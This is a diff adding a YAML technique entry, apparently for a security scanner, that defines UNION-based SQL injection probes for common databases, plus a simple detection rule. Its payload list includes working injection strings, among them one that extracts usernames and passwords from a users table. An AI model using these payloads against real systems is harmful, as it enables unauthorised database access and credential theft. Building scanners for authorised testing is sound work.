@@ -1,0 +1,26 @@
+techniques:
+  - id: sqli_union_basic
+    name: "SQL Injection - Union Based"
+    vuln_type: sqli
+    description: "UNION-based SQL injection for data extraction"
+    severity: high
+    technology: ["mysql", "postgresql", "mssql"]
+    depth: standard
+    tags: ["sqli", "union", "data-extraction"]
+    payloads:
+      - value: "' UNION SELECT NULL--"
+        description: "Column count detection (1 column)"
+      - value: "' UNION SELECT NULL,NULL--"
+        description: "Column count detection (2 columns)"
+      - value: "' UNION SELECT NULL,NULL,NULL--"
+        description: "Column count detection (3 columns)"
+      - value: "' UNION SELECT 1,2,3--"
+        description: "Column identification"
+      - value: "' UNION SELECT username,password FROM users--"
+        description: "Credential extraction"
+      - value: "' ORDER BY 1--"
+        description: "Column count via ORDER BY"
+    detection:
+      - type: string
+        value: "UNION"
+        description: "UNION query reflected"
